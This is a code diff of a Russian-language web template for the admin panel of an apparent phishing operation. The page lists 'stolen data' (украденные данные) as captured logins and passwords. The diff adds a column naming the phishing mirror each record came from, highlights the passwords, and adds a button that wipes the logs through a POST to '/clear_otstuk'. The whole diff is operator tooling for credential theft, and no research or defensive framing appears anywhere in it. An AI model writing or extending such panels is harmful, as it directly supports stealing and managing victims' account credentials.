@@ -2,7 +2,12 @@
 
 {% block content %}
 <div class="d-flex justify-content-between align-items-center mb-4">
-    <h1 class="h3 text-light fw-semibold">Отстук (login:password)</h1>
+    <h1 class="h3 text-light fw-semibold">Отстук (украденные данные)</h1>
+    {% if logs %}
+    <button class="btn btn-outline-danger btn-sm" onclick="clearLogs()">
+        <i class="fas fa-trash"></i> Очистить логи
+    </button>
+    {% endif %}
 </div>
 
 <div class="card bg-dark border-secondary shadow">
@@ -11,6 +16,7 @@
             <thead class="table-dark">
                 <tr>
                     <th>Время</th>
+                    <th>Зеркало</th>
                     <th>Логин</th>
                     <th>Пароль</th>
                 </tr>
@@ -19,13 +25,19 @@
                 {% for log in logs %}
                 <tr>
                     <td>{{ log.split(']')[0][1:] }}</td>
+                    <td>
+                        <span class="badge bg-secondary">
+                            {{ log.split('Зеркало: ')[1] if 'Зеркало: ' in log else 'Неизвестно' }}
+                        </span>
+                    </td>
                     <td>{{ log.split('Логин: ')[1].split(' | ')[0] }}</td>
-                    <td>{{ log.split('Пароль: ')[1] }}</td>
+                    <td><strong class="text-danger">{{ log.split('Пароль: ')[1].split(' | ')[0] }}</strong></td>
                 </tr>
                 {% else %}
                 <tr>
-                    <td colspan="3" class="text-center py-5 text-muted">
-                        Пока нет данных
+                    <td colspan="4" class="text-center py-5 text-muted">
+                        <i class="fas fa-key fa-3x mb-3 opacity-50"></i><br>
+                        Пока нет украденных данных
                     </td>
                 </tr>
                 {% endfor %}
@@ -33,4 +45,15 @@
         </table>
     </div>
 </div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function clearLogs() {
+    if (confirm('Вы действительно хотите очистить все логи отстука?')) {
+        fetch('/clear_otstuk', { method: 'POST' })
+            .then(() => location.reload());
+    }
+}
+</script>
 {% endblock %}
